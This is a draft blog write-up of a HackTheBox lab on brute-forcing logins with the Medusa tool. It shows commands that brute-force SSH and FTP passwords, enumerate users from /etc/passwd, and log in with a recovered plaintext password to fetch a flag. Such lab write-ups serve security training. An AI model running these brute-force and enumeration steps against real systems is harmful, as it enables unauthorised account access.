---
title: 'HTB - Login Brute Forcing Module - Medusa'
date: '2025-12-15T16:01:00+00:00'
author: Ryan
layout: post
draft: true
categories:
    - penetration-testing
    - infosec
    - hackthebox
---

# HackTheBox Login Brute Force - Medusa

This is part of a multi-part series documenting my process for completing the HackTheBox modules.

Medusa is another popular login brute-forcing tool similar to Hydra. It supports multiple protocols and is known for its speed and efficiency. Medusa can perform parallelized attacks, making it suitable for large-scale brute-forcing tasks. It also allows for customization of attack parameters, such as the number of concurrent threads and timeout settings.

## Web Services Challenge

This is another easy challenge. We'll cover cracking both FTP and SSH logins using Medusa. For this challenge, we are provided with a username for the SSH server: `sshuser`. We can use the following command:

```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

This command specifies the target host and port, the username to test, the password list to use, the module for SSH, and the number of concurrent threads. Medusa will eventually guess the correct password. At which point, you can use an SSH client to connect to the server. But wait, there's more!

Now that we have access to the server, we need to identify other potential attack surfaces. Using `netstat` (no `ss` on this box), we find that this server also hosts an FTP site. 

```bash
sshuser@ng-2320105-loginbfservice-w29z2-549ffc55c4-wfpjm:~$ netstat -tnlp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Now, let's poke around a bit. Let's check `/etc/passwd` to see if there are any other users on the system:
```bash
sshuser@ng-2320105-loginbfservice-w29z2-549ffc55c4-wfpjm:/home$ cat /etc/passwd |grep ftp
ftp:x:105:107:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001::/home/ftpuser:/bin/sh
```
Ah, two FTP user accounts. Let's see if we can brute-force them using Medusa as well. Interestingly, `medusa` is already installed on the box along with a password list lol (which is not real-world... but, I digress). So we can run the following commands directly from the SSH session:

```bash

<:~$ medusa -h 127.0.0.1 -u ftpuser -P ./2020-200_most_used_passwords.txt  -M ftp -t 3
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: picture1 (1 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: 1234 (16 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: iloveyou (17 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: aaron431 (18 of 197 complete)
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: qqww1122 (19 of 197 complete)
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: ********** [SUCCESS]
```

Now that we have the FTP credentials, we can connect to the FTP server and retrieve the flag:
```bash
sshuser@ng-2320105-loginbfservice-w29z2-549ffc55c4-wfpjm:~$ ftp ftp://ftpuser:qqww1122@localhost
Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
No entry for terminal type "xterm-kitty";
using dumb terminal settings.
```
We can then list the directory:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||40061|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Dec 15 18:29 flag.txt
226 Directory send OK.

```

And finally, pull the flag file:
```bash

ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||28379|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |***************************************************************************************|    35        0.98 MiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (264.95 KiB/s)
ftp> exit
221 Goodbye.
```

Exit the `ssh` session and cat the flag file to find the flag. Done. If you are like me and forgot the FTP commands a decade ago, just type in `help` in the ftp session. 




